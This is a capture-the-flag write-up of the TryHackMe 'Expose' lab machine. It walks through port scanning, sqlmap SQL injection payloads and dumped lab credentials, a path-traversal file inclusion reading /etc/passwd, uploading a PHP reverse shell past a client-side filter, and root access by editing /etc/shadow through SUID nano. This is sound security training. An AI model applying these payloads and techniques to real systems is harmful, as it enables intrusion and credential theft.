---
title: "Expose TryHackMe Writeup"
tags: ["CTF", "TryHackMe", "OSINT", "Cybersecurity", "Linux", "Privilege Escalation", "SUID", "LFI", "FTP", "SSH", "SQL Injection", "Burp Suite", "Nmap", "Dirsearch", "Sqlmap", "Reverse Shell", "Nano", "openssl", "Pentestmonkey", "revshells.com", "PHP", "Javascript", "Bypass", "Enumeration", "Exploitation", "Root", "Flag", "Writeup"]
style: fill
color: secondary
image: "/assets/images/assets/images/proofs-of-expose/expose-cover.png"
description: " A easy level linux machine on THM"

permalink: /Expose-TryHackMe-Writeup
---

Today we are going to solve another CTF challenge "Expose" which is available on TryHackMe. So let's get started and learn how to analyze the services running behind the ports and how to exploit them to gain root access.

[Expose - TryHackMe](https://tryhackme.com/room/expose)

> Steps taken to exploit this "Expose" Linux machine on THM and gain root access. It starts with cracking a hash to obtain a password, then proceeds to fuzz for parameters and discover a local file inclusion vulnerability. The vulnerability is exploited to enumerate the usernames and find the user "zeamkish". The user is used to access a file upload page, where a bypass is performed to upload a PHP reverse shell. The reverse shell is executed, and the user "www-data" is obtained. Further enumeration is done, and the credentials stored in "ssh_cred.txt" are used to log in as the user "zeamkish" via SSH. Privilege escalation is achieved by exploiting the SUID bit set on the Nano editor, allowing the modification of the root password in the "/etc/shadow" file. Finally, the user is switched to "root" using the new password, and the flag is found in the root's home directory.	
  
# Initial Nmap Scan

```bash
╰─  rustscan 10.10.51.125                                                 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/dev0x7/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.51.125:21
Open 10.10.51.125:22
Open 10.10.51.125:53
Open 10.10.51.125:1337
Open 10.10.51.125:1883
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 21,22,53,1337,1883 10.10.51.125

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-20 20:38 IST
Initiating Ping Scan at 20:38
Scanning 10.10.51.125 [2 ports]
Completed Ping Scan at 20:38, 0.16s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:38
Completed Parallel DNS resolution of 1 host. at 20:38, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 20:38
Scanning 10.10.51.125 [5 ports]
Discovered open port 1883/tcp on 10.10.51.125
Discovered open port 21/tcp on 10.10.51.125
Discovered open port 1337/tcp on 10.10.51.125
Discovered open port 53/tcp on 10.10.51.125
Discovered open port 22/tcp on 10.10.51.125
Completed Connect Scan at 20:38, 0.17s elapsed (5 total ports)
Nmap scan report for 10.10.51.125
Host is up, received conn-refused (0.16s latency).
Scanned at 2024-02-20 20:38:16 IST for 1s

PORT     STATE SERVICE REASON
21/tcp   open  ftp     syn-ack
22/tcp   open  ssh     syn-ack
53/tcp   open  domain  syn-ack
1337/tcp open  waste   syn-ack
1883/tcp open  mqtt    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds
```

```bash
╰─  nmap -sC -sV -sT -v -p 21,22,53,1337,1883 10.10.51.125
PORT     STATE SERVICE                 VERSION
21/tcp   open  ftp                     vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.72.161
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh                     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 95:76:8a:21:30:68:f8:3d:a3:e0:3a:49:eb:9e:a4:72 (RSA)
|   256 09:37:61:8c:2b:91:4a:4e:36:ba:10:43:4d:68:f6:16 (ECDSA)
|_  256 04:18:f5:23:d6:8b:16:f4:d7:b3:aa:99:fc:41:c7:f3 (ED25519)
53/tcp   open  domain                  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
1337/tcp open  http                    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: EXPOSED
1883/tcp open  mosquitto version 1.6.9
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     $SYS/broker/load/messages/received/5min: 0.20
|     $SYS/broker/bytes/sent: 4
|     $SYS/broker/load/bytes/sent/1min: 3.65
|     $SYS/broker/load/sockets/5min: 0.77
|     $SYS/broker/load/connections/15min: 0.07
|     $SYS/broker/load/sockets/1min: 2.90
|     $SYS/broker/load/sockets/15min: 0.29
|     $SYS/broker/store/messages/bytes: 180
|     $SYS/broker/load/connections/5min: 0.20
|     $SYS/broker/version: mosquitto version 1.6.9
|     $SYS/broker/uptime: 1881 seconds
|     $SYS/broker/messages/sent: 1
|     $SYS/broker/messages/received: 1
|     $SYS/broker/load/messages/received/1min: 0.91
|     $SYS/broker/heap/maximum: 49688
|     $SYS/broker/load/messages/received/15min: 0.07
|     $SYS/broker/load/bytes/sent/5min: 0.79
|     $SYS/broker/load/bytes/received/5min: 3.53
|     $SYS/broker/load/messages/sent/1min: 0.91
|     $SYS/broker/load/connections/1min: 0.91
|     $SYS/broker/load/bytes/received/1min: 16.45
|     $SYS/broker/load/messages/sent/5min: 0.20
|     $SYS/broker/load/bytes/received/15min: 1.19
|     $SYS/broker/load/bytes/sent/15min: 0.27
|     $SYS/broker/load/messages/sent/15min: 0.07
|_    $SYS/broker/bytes/received: 18
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

# Directory Enumeration
```bash
╰─  dirsearch -u http://10.10.29.94:1337

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/dev0x7/Downloads/THM/Expose/reports/http_10.10.29.94_1337/_24-02-20_22-57-03.txt

Target: http://10.10.29.94:1337/

[22:57:03] Starting: 
[22:57:13] 403 -  278B  - /.htaccess.sample
[22:57:13] 403 -  278B  - /.htaccess.bak1
[22:57:13] 403 -  278B  - /.htaccess.orig
[22:57:13] 403 -  278B  - /.htaccess.save
[22:57:13] 403 -  278B  - /.htaccess_extra
[22:57:13] 403 -  278B  - /.htaccess_sc
[22:57:13] 403 -  278B  - /.htaccess_orig
[22:57:13] 403 -  278B  - /.htaccessBAK
[22:57:13] 403 -  278B  - /.htaccessOLD
[22:57:13] 403 -  278B  - /.html
[22:57:13] 403 -  278B  - /.htpasswd_test
[22:57:13] 403 -  278B  - /.httr-oauth
[22:57:13] 403 -  278B  - /.ht_wsr.txt
[22:57:14] 403 -  278B  - /.htm
[22:57:14] 403 -  278B  - /.htpasswds
[22:57:14] 403 -  278B  - /.htaccessOLD2
[22:57:16] 403 -  278B  - /.php
[22:57:28] 301 -  317B  - /admin  ->  http://10.10.29.94:1337/admin/
[22:57:30] 200 -  693B  - /admin/
[22:57:31] 200 -  693B  - /admin/index.php
[22:57:32] 301 -  321B  - /admin_101  ->  http://10.10.29.94:1337/admin_101/
[22:58:10] 301 -  322B  - /javascript  ->  http://10.10.29.94:1337/javascript/
[22:58:23] 301 -  322B  - /phpmyadmin  ->  http://10.10.29.94:1337/phpmyadmin/
[22:58:25] 200 -    3KB - /phpmyadmin/doc/html/index.html
[22:58:27] 200 -    3KB - /phpmyadmin/index.php
[22:58:27] 200 -    3KB - /phpmyadmin/
[22:58:33] 403 -  278B  - /server-status
[22:58:33] 403 -  278B  - /server-status/
[22:58:50] 414 -  355B  - /wps/contenthandler/!ut/p/digest!8skKFbWr_TwcZcvoc9Dn3g/?uri=http://www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com

Task Completed
```
![Screenshot](/assets/images/proofs-of-expose/1.png)

In the /admin directory we find a login page. But in the /admin_101 directory we fiind the same login page but with the username is filled.  Now we have a username.

![Screenshot](/assets/images/proofs-of-expose/2.png)

We will capture the request and try with sqlmap to dump the database.

![Screenshot](/assets/images/proofs-of-expose/3.png)



# Using Sqlmap

```shell
╰─ sqlmap -r req --batch --dump --tamper=space2comment --random-agent --level 2 --risk 2 --dbs

sqlmap identified the following injection point(s) with a total of 821 HTTP(s) requests:                              
---                                                                                                                                                                                                                                          
Parameter: email (POST)                                                                                               
    Type: boolean-based blind                                                                                         
    Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)                                                                                                                                         
    Payload: email=hacker@root.thm' AND EXTRACTVALUE(9212,CASE WHEN (9212=9212) THEN 9212 ELSE 0x3A END) AND 'zKBc'='zKBc&password=hacker                                                                                                    
                                                                                                                      
    Type: error-based                                                                                                 
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)                                                                                                                                           
    Payload: email=hacker@root.thm' AND GTID_SUBSET(CONCAT(0x7171717071,(SELECT (ELT(3316=3316,1))),0x71766b7071),3316) AND 'zNKZ'='zNKZ&password=hacker                                                                                     
                                                                                                                                                                                                                                             
    Type: time-based blind                                 
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=hacker@root.thm' AND (SELECT 6032 FROM (SELECT(SLEEP(5)))ajDd) AND 'TGtK'='TGtK&password=hacker
---                                                        

available databases [6]:                                   
[*] expose                                                 
[*] information_schema                                     
[*] mysql                                                  
[*] performance_schema                                     
[*] phpmyadmin                                             
[*] sys                                                    

[19:30:55] [INFO] retrieved: 'hacker@root.thm'
[19:30:55] [INFO] retrieved: '1'
[19:30:56] [INFO] retrieved: 'VeryDifficultPassword!!#@#@!#!@#1231'
Database: expose                                           
Table: user                                                
[1 entry]                                                  
+----+-----------------+---------------------+--------------------------------------+
| id | email           | created             | password                             |
+----+-----------------+---------------------+--------------------------------------+
| 1  | hacker@root.thm | 2023-02-21 09:05:46 | VeryDifficultPassword!!#@#@!#!@#1231 |
+----+-----------------+---------------------+--------------------------------------+

Database: expose                                                                                                                                                                                                                             
Table: config                                              
[2 entries]                                                
+----+------------------------------+-----------------------------------------------------+
| id | url                          | password                                            |
+----+------------------------------+-----------------------------------------------------+
| 1  | /file1010111/index.php       | 69c66901194a6486176e81f5945b8929 (easytohack)       |
| 3  | /upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z |
+----+------------------------------+-----------------------------------------------------+

```

Next, we visit `/file1010111/index.php`.

![Screenshot](/assets/images/proofs-of-expose/5.png)

By providing the password, we get a hint to fuzz for parameters. Without checking anything more, we visit `/upload-cv00101011/index.php`.

![Screenshot](/assets/images/proofs-of-expose/4.png)

The page `/upload-cv00101011/index.php` also gives us a hint about the password being the name of the machine user starting with the letter Z. An attempt was made by using Burp Suite to brute force the usernames. While the brute force is running, we check out `/file1010111/index.php` again.

![Screenshot](/assets/images/proofs-of-expose/7.png)

On checking out the source page of `/file1010111/index.php` we get another hint to try file or view as GET parameters. On a closer look at the URL, this might be a page to view files on the system, and a local file inclusion vulnerability might be present.

For a simple check, we use `?file=index.php` to check for local file inclusion. Upon calling `http://10.10.192.227:1337/file1010111/index.php?file=index.php` and providing the cracked password, we see that the page has now been loaded multiple times. An LFI is present.

Due to the fact that we need to know the username of the machine to access the other page, we try to check out the `/etc/passwd` file on the system. By providing the URL `http://10.10.192.227:1337/file1010111/index.php?file=../../../../etc/passwd` we are able to enumerate the user `zeamkish`.

![Screenshot](/assets/images/proofs-of-expose/6.png)

We directly head up to `/upload-cv00101011/` and provide the found user.

We are greeted with a file upload page. 

Looking at the source of the page, we see a simple local upload filter in javascript checking for file endings. Only JPG or PNG files are allowed.

![Screenshot](/assets/images/proofs-of-expose/9.png)

We can bypass this by using Burp Suite to intercept the request and change the file extension to `.php`.

And the files are stored at the `/upload_thm_1001` folder.

Next, me make use of pentestmonkey PHP reverse shell provided by revshells.com

For a simple bypass, Create php rev. shell save as for example `rev.php#.png` and upload using by Burp. We capture our upload request in Burp Suite And try to change file name to `rev.phar`. Alternatively, a breakpoint in the JavaScript can be set, a `.php` file be uploaded and the variable `fileExtension` be changed in the console to contain 'jpg' instead of 'php'

![Screenshot](/assets/images/proofs-of-expose/15.png)

Next, we head to `/upload-cv00101011/upload_thm_1001/` and set up a listener, and we see that our bypass was successful.

Upon calling our reverse shell PHP script our shell connects. We are www-data.

While enumerating for the usual suspects like `sudo -l` or SUID binaries, nothing could be found. We were not allowed to use Find. That is odd; it might be a big hint to prevent us from finding SUID binaries. But taking a look at `zeamkish's` home directory, we see the flag that we are not allowed to access, but the credentials stored for the user in `ssh_cred.txt`.

We use the credentials to log in to the system as the user `zeamkish` using SSH. We are in the home directory of `zeamkish` and are able to read the user's flag.

![Screenshot](/assets/images/proofs-of-expose/11.png)
![Screenshot](/assets/images/proofs-of-expose/10.png)

Upon checking for interesting SUID binaries as the user `zeamkish` we get an interesting hit. 

![Screenshot](/assets/images/proofs-of-expose/13.png)
![Screenshot](/assets/images/proofs-of-expose/14.png)

The editor Nano has a SUID bit set. With that, we are able to read and write files outside of our rights as root. For a fast but harmful privilege escalation, we change the `/etc/shadow` file and edit the password of the user `root`

With the use of `openssl` we generate our new password.

Next we just open `/etc/shadow` using `/usr/bin/nano` and insert our custom password hash.

After editing the password of `root`, we are able to change the user to root using `su` and providing our chosen password. Next, we find the flag in the home directory of `root`.


# Exploiting SUID for Privilege Escalation


![Screenshot](/assets/images/proofs-of-expose/12.png)

Voila! We have the root flag!

we have successfully exploited the Expose machine on THM and gained root access.

# Conclusion

This was a fun machine to exploit. We started with dumping the database to obtain a password, then proceeded to fuzz for parameters and discover a local file inclusion vulnerability. The vulnerability was exploited to enumerate the usernames and find the user "zeamkish". The user was used to access a file upload page, where a bypass was performed to upload a PHP reverse shell. The reverse shell was executed, and the user "www-data" was obtained. Further enumeration was done, and the credentials stored in "ssh_cred.txt" were used to log in as the user "zeamkish" via SSH. Privilege escalation was achieved by exploiting the SUID bit set on the Nano editor, allowing the modification of the root password in the "/etc/shadow" file. Finally, the user was switched to "root" using the new password, and the flag was found in the root's home directory.

# References

[Reference for SUID](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)

Stay tuned for more interesting writeups and walkthroughs.

Until next time, happy hacking!